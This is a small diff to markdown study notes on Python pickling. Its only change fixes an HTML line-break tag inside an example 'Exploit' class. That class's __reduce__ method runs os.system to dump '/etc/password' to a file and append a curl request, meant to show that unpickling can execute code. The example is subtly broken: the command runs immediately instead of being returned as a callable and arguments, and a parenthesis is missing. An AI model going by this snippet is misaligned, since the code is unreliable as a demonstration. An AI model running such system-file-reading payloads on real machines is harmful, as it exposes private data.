@@ -57,5 +57,5 @@ __NOTE__ : Unpickling (deserializing) can execute code (NOT SAFE) <br />
 - recursive objects can be pickled.
 
     class Exploit(object):<br />
-        def __reduce__(self):<br< />
+        def __reduce__(self):<br />
             return (os.system("cat /etc/password > exploit.txt && curl www.google.com >> exploit.txt")
